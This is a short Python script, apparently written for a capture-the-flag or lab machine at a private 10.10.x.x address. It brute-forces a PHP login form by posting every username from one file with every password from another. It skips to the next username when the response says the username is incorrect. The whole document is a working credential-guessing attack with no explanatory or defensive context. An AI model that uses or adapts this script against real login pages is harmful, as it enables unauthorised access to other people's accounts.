#!/usr/bin/env python3
import requests

url = "http://10.10.228.69/sUp3r-s3cr3t/authenticate.php"

def login(username, password):
	r = requests.post(url, data = {
			"username":username,
			"password":password,
			"submit":"Login",
		})
	return r
users = open("userid","r")
users = str(users.read())
usernames = [ cred for cred in users.split('\n')]
passes = open("credentials.txt","r")
passes = str(passes.read())
passwords  = [ pas for pas in passes.split('\n')]
for i in range(len(usernames)):
	for j in range(len(passwords)):
		response = login(usernames[i],passwords[j]).text
		print(response,usernames[i],passwords[j])
		if 'Incorrect username' in response :
			break